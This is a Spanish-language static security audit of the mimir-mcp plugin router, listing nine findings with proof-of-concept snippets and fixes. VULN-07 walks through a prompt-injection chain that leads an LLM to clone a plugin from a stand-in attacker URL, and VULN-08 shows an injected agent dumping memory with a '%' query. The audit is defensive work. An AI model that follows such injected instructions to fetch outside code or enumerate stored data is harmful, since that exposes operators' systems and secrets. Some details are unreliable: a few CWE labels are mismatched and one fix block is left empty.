# Auditoría de seguridad — mimir-mcp

## Resumen ejecutivo

Auditoría red-team realizada el 2026-04-26 sobre el commit `b429e4f0`
(rama `main`) del paquete **mimir-mcp** v0.1.0. Análisis estático
únicamente — el proyecto opera sobre `stdio` (sin red expuesta), no
admite probe activo y los plugins downstream se invocan localmente
contra inventory declarativo.

**Postura general:** **Sólida para un proyecto de homelab pre-publish.**
El framework implementa cinco capas de defensa documentadas y tres de
ellas están totalmente activas en el código (manifest validation +
quarantine, scoped credential vault con anti-newline-injection, profile
gate con allowlist, audit log con args hashed, tool whitelist/blacklist
vía middleware FastMCP). El diseño es consciente del modelo de amenazas
declarativo: plugins son código no confiable, el operador es trusted, el
cliente MCP es transitivo. La superficie ofensiva real es pequeña.

Los hallazgos se concentran en **discrepancias entre lo prometido y lo
implementado** (audit log rotation declarada pero no implementada, manifest
fields `filesystem_read/write/exec` declarados como enforce pero anotados
como "still planned" en la documentación, profile gate fail-open ante YAML
malformado) y en **deuda heredada del aggregator legacy** (`server.py` y
`server.legacy.py` siguen distribuidos como módulos del paquete v0.1.0
pese a que `router.py` es el entry point oficial; las dependencias
heredadas `paramiko`, `pygithub`, `requests`, `pyserial` viajan como
required en lugar de optional).

**Top 3 hallazgos:**

1. **`[VULN-01]` Aggregator legacy distribuido junto al framework
   nuevo** — `server.py` (idéntico a `server.legacy.py`, 520 líneas)
   queda declarado en `[tool.setuptools].py-modules` y se publicará en
   el wheel v0.1.0. No tiene quarantine, profile gate, scoped
   credentials ni audit log con args hash. Si un operador lo invoca por
   typo o por documentación ajena, queda fuera del modelo de seguridad.
   Severity MEDIUM / Confidence HIGH.
2. **`[VULN-02]` Profile gate fail-open ante YAML malformado** — un
   typo en `profiles/default.yaml` invalida el parse, `load_enabled_plugins`
   retorna `None` y la consecuencia documentada de `None` es "admit
   everything". Un operador que confiaba en `enabled_plugins: [a, b]`
   pasa silenciosamente a admitir todos los plugins descubiertos.
   Severity MEDIUM / Confidence HIGH.
3. **`[VULN-04]` Audit log sin rotation pese a docs** — `docs/security-model.md`
   afirma que la rotation es diaria, pero `core/audit.py` solo hace
   `open(target, "a")`. Crecimiento ilimitado → DoS de disco y mayor
   ventana de log en disco con argumentos hashed. Severity MEDIUM /
   Confidence HIGH.

## Notas metodológicas

### Out of scope

- **Live probe / dynamic analysis.** Mimir corre sobre `stdio` y no
  expone red — este audit es solo análisis estático.
- **Plugins downstream.** `homelab/plugin.toml`, `gpon/plugin.toml`,
  `uart/plugin.toml` apuntan a repos externos (`uv run homelab-proxmox-mcp`,
  `uv run gpon-mcp`, `uv run uart-mcp`). El código de esos repos NO se
  audita aquí — solo el contrato declarado en sus `plugin.toml`.
- **`.venv/` directorios** dentro de `plugins/{homelab,gpon,uart}/.venv/`
  y `mcp-servers/mimir-mcp/.venv/` — son entornos materializados por
  `uv sync`, no fuente del proyecto.
- **Cliente MCP** que invoca a Mimir (Claude Desktop, agentes en loop).
  Mimir asume cliente transitivamente confiable a través del proceso
  parent que arranca el subprocess.

### Limitaciones / visibility gaps

- **`server.py` runtime activation path no observado.** Sé que está en
  `[tool.setuptools].py-modules` y publicará en el wheel, pero no he
  ejecutado `pip install` ni inspeccionado el wheel real. La cadena
  exploit de `[VULN-01]` asume que el operador puede invocar `python -m
  server` desde el venv instalado — es plausible pero no demostrado en
  esta sesión.
- **Test coverage de los módulos core es alta** (4734 líneas de tests
  totales, `test_router_wiring.py` solo tiene 1481 líneas) pero los
  tests `test_security.py` + `test_security_extended.py` (212 líneas
  combinadas) prueban `native_tools/` del **aggregator legacy**, no
  módulos de `core/`. Confidence sobre el código del framework Mimir
  recae en cobertura indirecta vía `test_core_*`.
- **CI workflow** referenciado en README badges pero no leído en este
  audit — no he verificado si hay scanners (gosec/bandit/snyk) que
  bloqueen merge.

## Threat model resumido

| Eje | Detalle |
|-----|---------|
| **Activos** | Credenciales del operador (`PROXMOX_*_TOKEN`, `GPON_*`, `TAILSCALE_*`, etc.); inventory con IPs/hosts internos; audit log con args hashed. |

## Findings

### `[VULN-01]` Aggregator legacy `server.py` distribuido junto al framework nuevo

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Logic / Configuration (CWE-1188 — Insecure Default Initialization of Resource)
- **Location:** `pyproject.toml:64` + `server.py` (520 líneas, idéntico a `server.legacy.py`)

**Description.** `pyproject.toml` declara `[tool.setuptools] py-modules = ["router", "server"]`, lo que significa que el wheel publicado en PyPI contiene tanto `router.py` (entry point oficial declarado en `[project.scripts]`) como `server.py`. `diff server.py server.legacy.py` devuelve vacío — son el mismo aggregator legacy de 520 líneas que precede al framework Mimir y NO usa los módulos `core.*`: ni quarantine, ni profile gate, ni `core.audit.log_tool_call` con args hash, ni `core.secrets.PluginContext` con scope check. Tiene su propio `_FAILURE_LOG = Path(__file__).resolve().parent / "failure.log"` y carga downstream MCPs hardcodeados desde `native_tools/`.

**Attack Vector.** Tres rutas plausibles:

1. Un operador que arrastró documentación o aliases del periodo pre-rename (`HOMELAB_FASTMCP_*` → `MIMIR_*`) ejecuta `python -m server` o `python server.py` por reflejo y obtiene el aggregator legacy en lugar del router moderno.
2. Una herramienta de descubrimiento (auto-completion, MCP marketplace, IDE) sugiere `server` porque el módulo está exportado.
3. Documentación de terceros que copió un snippet de la era previa al rename sigue apuntando a `server.py`.

En cualquiera de los tres casos, las protecciones del modelo de cinco capas no aplican: el aggregator legacy mata el contrato.

**PoC (no destructivo).**

```bash
# Reproduce que server.py existe, es público y es idéntico al legacy
python -c "import server; print(server.__file__)"   # imprime ruta dentro del paquete
diff "$(python -c 'import server, os; print(os.path.dirname(server.__file__))')/server.py" \
     "$(python -c 'import server, os; print(os.path.dirname(server.__file__))')/server.legacy.py"
# → diff vacío
```

**Fix.** Tres opciones (ordenadas por preferencia):

1. **Eliminar `server.py` y `server.legacy.py` del repo y de `py-modules`** antes del primer release público. La fase 8 ya está planeada — adelantarla a antes de PyPI evita publicar deuda. Los tests `test_security.py` + `test_security_extended.py` migran a `tests/legacy/` (donde ya viven sus dependencias `native_tools.*`) o se eliminan.
2. **Si la eliminación no es viable hoy**, gate `server.py` detrás de un `RuntimeError` explícito al import:
   ```python
   if not os.environ.get("MIMIR_LEGACY_AGGREGATOR_OK"):
       raise RuntimeError(
           "server.py is the deprecated aggregator. Use 'mimir' (router.py). "
           "Set MIMIR_LEGACY_AGGREGATOR_OK=1 to override."
       )
   ```
   Reduce el riesgo de invocación accidental sin perder la utilidad para los tests legacy.
3. **Mínimo viable**: añadir un módulo-level `warnings.warn(DeprecationWarning, ...)` al inicio de `server.py`. No bloquea la invocación, pero el operador ve la advertencia.

**Evidence.**

- `pyproject.toml:64` → `py-modules = ["router", "server"]`
- `server.py:1-5` y `server.legacy.py:1-5` → docstring idéntico ("Homelab FastMCP Aggregator. Reemplaza al mcp-router Go con FastMCP Python.")
- `wc -l` → 520 + 520, `diff` vacío
- `pyproject.toml:46-47` → `[project.scripts] mimir = "router:main"` (no expone `server`)
- Comentario en `pyproject.toml:59-62` ("server.py / server.legacy.py stay alongside until the legacy cleanup phase but are no longer the documented entry point")

### `[VULN-02]` Profile gate fail-open ante YAML malformado

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Authz / Access Control (CWE-755 — Improper Handling of Exceptional Conditions, CWE-657 — Violation of Secure Design Principles)
- **Location:** `core/profile.py:30-44`

**Description.** `load_enabled_plugins(profile_path)` está diseñado para devolver:

- `None` cuando no hay archivo o no hay key `enabled_plugins` → router admite todos los plugins descubiertos (semántica documentada como "no gate configured").
- `set()` cuando `enabled_plugins: []` → no se monta ningún plugin.
- `{name1, name2}` cuando hay lista no vacía → solo esos.

Pero la rama `except yaml.YAMLError: return None` (línea 35) y `if not isinstance(data, dict): return None` (línea 37) **convierten un profile malformado en "admit everything"**, sin distinción del caso "no hay archivo". Para un operador que confiaba en `enabled_plugins: [homelab, gpon]` como allowlist, un typo en el YAML (un `:` mal puesto, una indentación rota) silenciosamente abre todo el conjunto de plugins descubiertos a activarse — incluyendo plugins que el operador había instalado pero quería mantener desactivados.

**Attack Vector.** Operator-error amplificado por fail-open. Tres escenarios:

1. El operador edita `profiles/default.yaml` para añadir un plugin nuevo, comete un typo, no reinicia con `--dry-run` para verificar, y al reiniciar Mimir levanta plugins extra silenciosamente.
2. Un atacante con write-access al filesystem corrompe el YAML deliberadamente para activar plugins que estaban gateados (esto presume write-access; severidad reducida en consecuencia, pero el fail-open sigue siendo el problema).
3. Un script de migración o herramienta automática reescribe el archivo y lo deja malformado (ej. reorderado de keys, `yaml.safe_dump` con bug).

**PoC (no destructivo).**

```python
# Reproduce el fail-open
from pathlib import Path
import tempfile, textwrap

from core.profile import load_enabled_plugins

# Caso 1: archivo válido con allowlist
ok = Path(tempfile.mkdtemp()) / "ok.yaml"
ok.write_text("enabled_plugins:\n  - homelab\n")
print(load_enabled_plugins(ok))  # → {'homelab'}

# Caso 2: archivo malformado (típico typo)
bad = Path(tempfile.mkdtemp()) / "bad.yaml"
bad.write_text("enabled_plugins\n  - homelab\n")  # falta el ':'
print(load_enabled_plugins(bad))  # → None  (admit everything!)

# Caso 3: archivo no existe
none = Path(tempfile.mkdtemp()) / "nope.yaml"
print(load_enabled_plugins(none))  # → None  (admit everything, by design)
```

**Fix.** Distinguir "no hay archivo" (admit everything, by design) de "archivo presente pero no parseable" (fail-closed):

```python
def load_enabled_plugins(profile_path: Path) -> set[str] | None:
    if not profile_path.exists():
        return None  # No gate configured — admit everything.
    try:
        data = yaml.safe_load(profile_path.read_text(encoding="utf-8")) or {}
    except yaml.YAMLError as exc:
        # Profile present but unparseable — fail-closed: refuse to load any plugin.
        logger.error("profile %s is malformed: %s — denying all plugins", profile_path, exc)
        return set()
    if not isinstance(data, dict):
        logger.error("profile %s top-level must be a mapping — denying all plugins", profile_path)
        return set()
    if "enabled_plugins" not in data:
        return None  # by design
    value = data.get("enabled_plugins")
    if value is None:
        return set()
    if not isinstance(value, list):
        logger.error("profile %s 'enabled_plugins' must be a list — denying all plugins", profile_path)
        return set()
    return {str(v) for v in value}
```

Y actualizar `docs/security-model.md` (Layer 4) para mencionar la nueva semántica.

**Evidence.** `core/profile.py:30-44`. La docstring del módulo solo cubre tres casos (missing file / missing key / `[]`) — el caso "YAML inválido" no aparece en la documentación.

### `[VULN-03]` Manifest fields no enforced declarados como reales

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Logic / False sense of security (CWE-1059 — Insufficient Technical Documentation)
- **Location:** `core/loader.py:23-31` (docstring) + `plugins/_example/plugin.toml:18-25`

**Description.** El docstring del loader y la plantilla `_example/plugin.toml` muestran como parte del contrato `[security]`:

```toml
inventory_access = ["hosts:type=proxmox"]
network_dynamic = true
filesystem_read = []
filesystem_write = []
exec = []
```

Pero **ninguno de esos campos se enforce hoy**. `core/loader.py` los parsea y los guarda en `manifest.security`, y `core/inventory.py` solo se interesa por `credential_refs`. `docs/security-model.md` (Layer 5) lo dice explícitamente: *"`network_dynamic`, `filesystem_read`, `filesystem_write`, `exec` — still planned. Require interception at subprocess/socket/pathlib boundaries"*. La plantilla `_example/plugin.toml`, sin embargo, no contiene esa advertencia — un plugin author que la copia asume que declarar `filesystem_read = []` significa "el plugin no podrá leer archivos", cuando en realidad el plugin puede leer cualquier cosa que su subprocess pueda leer. Lo mismo con `exec = []`.

**Attack Vector.** Plugin author bien intencionado declara `filesystem_read = []` esperando enforcement, no implementa controles internos en su plugin (porque "el framework lo cubre"), publica el plugin como "seguro", y el operador que lo instala asume el contrato. Un fallo en el plugin (path traversal en una herramienta) tiene blast radius completo en el filesystem del operador.

**PoC (no destructivo).** Análisis estático del flow:

```bash
# 1. Confirmar que loader lee los campos pero no los devuelve a nada que los aplique
grep -n "filesystem_read\|filesystem_write\|exec\b\|network_dynamic" core/*.py router.py
# → solo aparecen en docstrings/sample, ningún getter ni gate runtime
```

**Fix.** Una de tres:

1. **Eliminar los campos del template `_example/plugin.toml`** y de la docstring de `core/loader.py` mientras no se enforce — más coherente con "ship what you actually do". Documentar que el contrato es solo `credential_refs` + `[tools]` por ahora.
2. **Mantener los campos pero añadir una advertencia inline**:
   ```toml
   # NOTE: Los campos siguientes están reservados para enforcement futuro
   # (ver docs/security-model.md Layer 5). HOY no se enforce nada — el
   # subprocess hereda los permisos del proceso router. Trate los campos
   # como documentación de intent, no como sandbox real.
   filesystem_read = []
   ```
3. **Implementar enforcement** mediante `seccomp`/`landlock` (Linux), file ACLs, o un wrapper subprocess que monta el plugin en un namespace restringido. Es una iniciativa significativa — coherente con que el doc lo declara "still planned".

**Evidence.**

- `core/loader.py:24-30` (docstring del manifest schema con los campos)
- `plugins/_example/plugin.toml:21-25` (campos sin advertencia)
- `docs/security-model.md` Layer 5 ("still planned")
- `grep -rn "filesystem_read\|filesystem_write" core/ router.py` → solo aparece en parsing, sin enforcement.

**Resolución:** _(ver tabla al final por VULN)_

### `[VULN-04]` Audit log sin rotation pese a la promesa de docs

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Logging / Operational (CWE-779 — Logging of Excessive Data, CWE-400 — Uncontrolled Resource Consumption)
- **Location:** `core/audit.py:54-79` + `docs/security-model.md` (Layer 2 affirmation "rotation is daily by date")

**Description.** El doc del modelo de seguridad afirma textualmente:

> Writes are fire-and-forget so an audit failure cannot block a tool call, and **rotation is daily by date**.

Pero `core/audit.py:74-76` solo hace:

```python
with target.open("a", encoding="utf-8") as fh:
    fh.write(json.dumps(entry, ensure_ascii=False) + "\n")
```

No hay `logging.handlers.TimedRotatingFileHandler`, no hay date suffix, no hay retention policy, no hay max size cap. Un Mimir instalado y dejado andando llenará disco eventualmente — más rápido cuando el LLM dispara muchas tool calls (que es el caso esperado). Cada entry es ~150-300 bytes, pero no hay límite. Adicionalmente, el audit log con args hashed es un blob de actividad que crece sin techo y un atacante con read-access al disco lo verá completo.

**Attack Vector.** No es ofensivo en sentido clásico; es un gap entre lo prometido y lo implementado:

1. **DoS local por consumo de disco** — uso intensivo del LLM ejecuta cientos de tool calls/sesión. En meses, el log llena la partición. Mimir falla.
2. **Audit retention indefinida** — un atacante con read-access al disco ve actividad completa (qué herramientas se llamaron, cuándo, en qué plugin). La retención sin límite incrementa la ventana del attacker.
3. **Confianza falsa**: el operator que leyó docs cree que rotation está activa y no implementa rotation externa (logrotate del sistema).

**PoC (no destructivo).**

```bash
# Reproduce que solo se hace append puro
grep -n "open\|RotatingFile\|TimedRotating\|rotate\|max_bytes" core/audit.py
# → solo aparece target.open("a") — ningún handler de rotation
```

**Fix.** Dos opciones simétricas:

1. **Implementar la rotation prometida.** Sustituir el `open("a")` por un handler con rotation (`logging.handlers.TimedRotatingFileHandler` con `when="midnight"`, `backupCount=7`):
   ```python
   import logging
   from logging.handlers import TimedRotatingFileHandler

   _audit_logger = logging.getLogger("mimir.audit")
   _handler = TimedRotatingFileHandler(_DEFAULT_PATH, when="midnight", backupCount=7)
   _handler.setFormatter(logging.Formatter("%(message)s"))
   _audit_logger.addHandler(_handler)
   _audit_logger.setLevel(logging.INFO)

   def log_tool_call(...):
       ...
       _audit_logger.info(json.dumps(entry, ensure_ascii=False))
   ```
2. **Corregir las docs** para reflejar que el audit log es append-only y la rotation es responsabilidad del operador (logrotate / journald). Más honesto que mantener un mismatch.

Cualquiera resuelve el problema. La opción 1 es más segura por defecto.

**Evidence.**

- `core/audit.py:74-76` (open append, sin rotation)
- `docs/security-model.md` Layer 2 ("rotation is daily by date")
- `wc -l <log>` test trivial: cualquier sesión moderada de uso ya genera kilobytes/MB.

**Resolución:** _(ver tabla al final por VULN)_

### `[VULN-05]` Dependencias heredadas (paramiko, pygithub, requests, pyserial) shipped como required

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Supply Chain / Dependencies (CWE-1357 — Reliance on Insufficiently Trustworthy Component)
- **Location:** `pyproject.toml:23-34`

**Description.** `pyproject.toml` declara como `dependencies` (no `optional-dependencies`):

```toml
dependencies = [
  "fastmcp>=3.0.0",
  "pyyaml>=6.0",
  # The four below are still needed because tests/ exercises the
  # legacy server.py + native_tools/ which use them. Once Fase 8
  # cleanup deletes those, these deps move to an optional ``legacy``
  # extra (or get dropped entirely if no consumer remains).
  "requests>=2.31.0",
  "pygithub>=2.3.0",
  "paramiko>=4.0.0",
  "pyserial>=3.5",
]
```

El comentario reconoce el problema. **Pero el wheel v0.1.0 se publica con esas cuatro deps como required**, por lo que cualquier instalador de Mimir framework hereda 4 dependencias que el código de `core/*` y `router.py` no usa. Particularmente `paramiko` (~10 CVEs históricos en últimos 5 años, incluyendo CVE-2023-48795 Terrapin), `pygithub` (depende de cryptography), `requests` (con su propia subred de transitivas).

**Attack Vector.** Supply chain bloat puro:

1. **Mayor superficie de ataque** — más bibliotecas a auditar y mantener al día.
2. **CVE pickup automático** — una CVE crítica en `paramiko` afecta a cualquier instalación de Mimir, aunque el operator no use plugins SSH.
3. **Transitive deps** — paramiko trae `cryptography`, `bcrypt`, `pynacl`. Cada una con sus propias deps.

**PoC (no destructivo).**

```bash
# Verificar que core/*, router.py NO usan paramiko/pygithub/requests/pyserial
grep -rn "import paramiko\|import requests\|import github\|from github\|import serial" core/ router.py
# → vacío. Solo native_tools/ y server.py legacy los usan.
```

**Fix.** Mover las cuatro deps a `[project.optional-dependencies]`:

```toml
[project.optional-dependencies]
```

### `[VULN-06]` Duplicate detection en `secrets/*.md` solo emite warning

- **Severity:** LOW
- **Confidence:** MEDIUM
- **Category:** Secrets Management / Operational (CWE-770 — Allocation of Resources Without Limits or Throttling)
- **Location:** `core/secrets.py:121-145`

**Description.** Cuando `_from_md_files` detecta el mismo `KEY=` definido más de una vez en distintos archivos `secrets/*.md` con valores divergentes, emite `warnings.warn(UserWarning, ...)` y devuelve la primera coincidencia. El `warnings` de Python por defecto se imprime una sola vez por (file, lineno) y se silencia si el filterwarnings se cambia. Un operador con varios `*.md` en `<MIMIR_HOME>/secrets/` puede tener silenciosamente dos versiones del mismo secret y nunca enterarse.

**Attack Vector.** Más bug operacional que exploit:

1. El operador rota una credencial, edita `secrets/new.md` con el valor nuevo pero olvida limpiar `secrets/old.md`. Dependiendo del orden de glob (que es no-determinista), Mimir usa una u otra.
2. Un atacante con write-access al filesystem (que ya tiene game over) puede plantar un `secrets/inject.md` con valores divergentes de los reales — pero como el primer match gana y el orden depende de glob, no es un ataque fiable de inyección.

**PoC (no destructivo).**

```python
# Reproduce el comportamiento de "primer match gana, warning silencioso"
import warnings
from pathlib import Path
from core import secrets

# Escribe dos archivos con el mismo key, valores distintos
home = Path(tempfile.mkdtemp())
(home / "a.md").write_text("FOO_TOKEN=value-A\n")
(home / "b.md").write_text("FOO_TOKEN=value-B\n")
secrets._SECRET_DIRS = [home]

with warnings.catch_warnings(record=True) as w:
    warnings.simplefilter("always")
    val = secrets._from_md_files("FOO_TOKEN")
    print(val, [str(x.message) for x in w])
# → value-A (o value-B, depende del orden de glob), 1 warning
```

**Fix.** Endurecer:

```python
# core/secrets.py:_from_md_files — al detectar duplicates, raise en lugar de warn
if duplicates_found:
    raise CredentialResolutionAmbiguous(
        f"Secret '{key}' has {duplicates_found + 1} divergent definitions in "
        f"secrets/*.md — refusing to guess. Consolidate the file before retrying."
    )
```

O al menos: log a stderr con WARNING level (no solo `warnings.warn`) para que el operator lo vea siempre.

**Evidence.** `core/secrets.py:131-145`. El `UserWarning` no aparece en stderr a menos que el operator haya configurado `warnings.simplefilter("always")` o el script no haya ya emitido el mismo warning previamente.

### `[VULN-07]` `router_install_plugin(execute=True)` clona URLs operator-supplied

- **Severity:** LOW
- **Confidence:** HIGH
- **Category:** Supply Chain / Code Execution (CWE-829 — Inclusion of Functionality from Untrusted Control Sphere)
- **Location:** `core/plugin_mgmt.py:157-232` + `router.py:373-402`

**Description.** Cuando el operador habilita explícitamente `[security].allow_plugin_install = true` en `router.toml`, el LLM puede invocar `router_install_plugin(source, execute=True)` y el router ejecuta `git clone <url>` sin confirmación adicional. La defensa principal es la flag de configuración (default `false`) y el `subprocess.run([..."git", "clone", url], ...)` con argv list (no `shell=True`). Pero una vez activado, el atacante ataca la cadena de confianza: convencer al LLM (vía prompt injection a través de un plugin previo, vía instrucción operator-supplied) de instalar un plugin desde una URL controlada por él.

Tras `git clone`, el plugin queda en `plugins/<name>/` pero no se carga automáticamente (necesita restart de Mimir + estar en el profile). Esa fricción es la mitigación principal.

**Attack Vector.** Cadena multi-paso:

1. Operator opt-in `allow_plugin_install = true` (decisión consciente, doc lo advierte).
2. Atacante influye en el LLM (prompt injection en datos consumidos por otra herramienta, social engineering al operador, plugin previo malicioso ya activo).
3. LLM invoca `router_install_plugin("https://evil.example.com/mcp.git", execute=True)`.
4. `git clone` se ejecuta. Plugin queda en `plugins/evil/`.
5. Para que se monte: operator necesita reiniciar + añadirlo al profile.

La cadena requiere mucha cooperación del operador en pasos posteriores. Por eso es LOW.

**PoC (no destructivo).**

```python
# Verificación de que el flag opt-in es la única defensa
import core.plugin_mgmt as pm
spec = pm.parse_install_source("https://github.com/attacker/evil-mcp.git")
# → {'kind': 'git', 'url': '...', 'target_name': 'evil-mcp', ...}
# Si execute=True llega y allow_plugin_install=true, git clone corre.
```

**Fix.** Hardening adicional, por orden de coste/beneficio:

1. **Emitir un audit log entry de severidad alta** cada vez que se invoca con `execute=True`, no como `status=ok` normal sino como `status="security_event:plugin_install_executed"`. Le da visibilidad al operador.
2. **Lista de allowlist de hosts** en `router.toml`:
   ```toml
   [security]
   allow_plugin_install = true
   plugin_install_allowlist = ["github.com/CTRQuko/*", "github.com/<trusted_orgs>/*"]
   ```
   Mimir rechaza URLs que no matcheen.
3. **Doble confirmación interactiva** vía un nuevo flag en lugar de `execute=True`: el primer call devuelve un token con TTL corto, el segundo call adjunta el token. Forzar dos pasos baja el riesgo de prompt-injection.

**Evidence.**

- `core/plugin_mgmt.py:200-219` (subprocess.run con argv list — anti-injection bien hecho)
- `router.py:390-394` (gate por `allow_plugin_install`)
- `core/plugin_mgmt.py:157-180` (`parse_install_source` admite cualquier URL HTTPS)

**Resolución:** _(ver tabla al final por VULN)_

### `[VULN-08]` `LIKE` pattern sin escapar `%` y `_` en memory backend

- **Severity:** LOW
- **Confidence:** HIGH
- **Category:** Injection (variant) / Information Disclosure (CWE-89 — SQL Injection (parameterized but pattern-injected))
- **Location:** `core/memory/sqlite.py:78-85`

**Description.** El método `search(query, limit)` construye el patrón `LIKE` directamente desde el input del LLM:

```python
def search(self, query: str, limit: int = 10) -> list[dict[str, Any]]:
    like = f"%{query}%"   # ← query no escapado
    with self._connect() as conn:
        rows = conn.execute(
            "SELECT id, content, tags, created_at FROM entries "
            "WHERE content LIKE ? ORDER BY created_at DESC LIMIT ?",
            (like, limit),
        ).fetchall()
```

**No es SQL injection clásica** — el placeholder `?` neutraliza eso. Pero `LIKE` interpreta `%` como wildcard de N chars y `_` como wildcard de 1 char. Un LLM que pasa `query="%"` recupera **todas** las entradas; `query="100%"` recupera todo lo que termina en cualquier cosa después de `100`. No es una "filtración" porque el memory backend es del propio operador (single-user, local SQLite), pero **invalida silenciosamente cualquier filtro** que el LLM creía aplicar.

**Attack Vector.** Bypass de filtro, no exfiltration:

1. El LLM intenta `search("api_key")` para encontrar memorias relacionadas con API keys; un query "%" devuelve todas las entradas (incluyendo posibles memorias accidentales con secretos en plaintext, depende de qué hay almacenado).
2. Un agente con prompt-injection puede pasar `query="%"` para enumerar el contenido del memory backend completo.

**PoC (no destructivo).**

```python
backend = SqliteMemory(path=":memory:")
backend.save("user data 1")
backend.save("user data 2")
backend.save("admin secret 3")

# Query "%" devuelve TODO
print(backend.search("%"))  # → 3 entries
# Query con guión bajo matches por char
print(backend.search("admin_secret"))  # _  matches "admin secret"
```

**Fix.** Escapar `%` y `_` antes de inyectar en el patrón:

```python
def search(self, query: str, limit: int = 10) -> list[dict[str, Any]]:
    # SQLite LIKE: escape % and _ con prefijo \ y declarar ESCAPE clause
    escaped = query.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
    like = f"%{escaped}%"
    with self._connect() as conn:
        rows = conn.execute(
            "SELECT id, content, tags, created_at FROM entries "
            "WHERE content LIKE ? ESCAPE '\\' ORDER BY created_at DESC LIMIT ?",
            (like, limit),
        ).fetchall()
    ...
```

**Evidence.** `core/memory/sqlite.py:79`. Tests en `test_core_memory.py` (130 líneas) probablemente cubren happy-path; verificar si incluyen casos con `%`/`_` en query.

**Resolución:** _(ver tabla al final por VULN)_

### `[VULN-09]` Vault file write no atómico

- **Severity:** LOW
- **Confidence:** HIGH
- **Category:** Secrets Management / Availability (CWE-572 — Call to Thread run() instead of start(), CWE-755 variant)
- **Location:** `core/bootstrap.py:198-206`

**Description.** `router_add_credential` actualiza el vault file así:

```python
existing_lines: list[str] = []
if vault_file.exists():
    existing_lines = [
        line
        for line in vault_file.read_text(encoding="utf-8").splitlines()
        if not line.startswith(f"{ref}=")
    ]
existing_lines.append(f"{ref}={value}")
vault_file.write_text("\n".join(existing_lines) + "\n", encoding="utf-8")
```

`write_text` no es atómica: abre el archivo en modo `w` (truncando), escribe, cierra. Si el proceso muere entre truncate y close (kill, OS crash, disk full mid-write), el vault queda parcial o vacío. Todas las credenciales pre-existentes se pierden.

**Attack Vector.** Pérdida de datos por fallo, no exfiltration:

1. El operador llama `router_add_credential` durante un OS update / reboot inesperado.
2. Disk-full durante write deja el vault truncado.

**PoC (no destructivo).** Difícil sin modificar el FS — basta inspección de código.

**Fix.** Patrón write-rename-replace (atómico en POSIX, near-atómico en Windows con MoveFileEx):

```python
import os
import tempfile

def _atomic_write_text(path: Path, text: str) -> None:
    fd, tmp = tempfile.mkstemp(dir=str(path.parent), prefix=".tmp-", suffix=".swap")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(text)
            fh.flush()
            os.fsync(fh.fileno())
        os.replace(tmp, path)  # POSIX atomic rename, Windows replace
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise

# En lugar de:
# vault_file.write_text(...)
_atomic_write_text(vault_file, "\n".join(existing_lines) + "\n")
```

**Evidence.** `core/bootstrap.py:198-206`.

**Resolución:** _(ver tabla al final por VULN)_
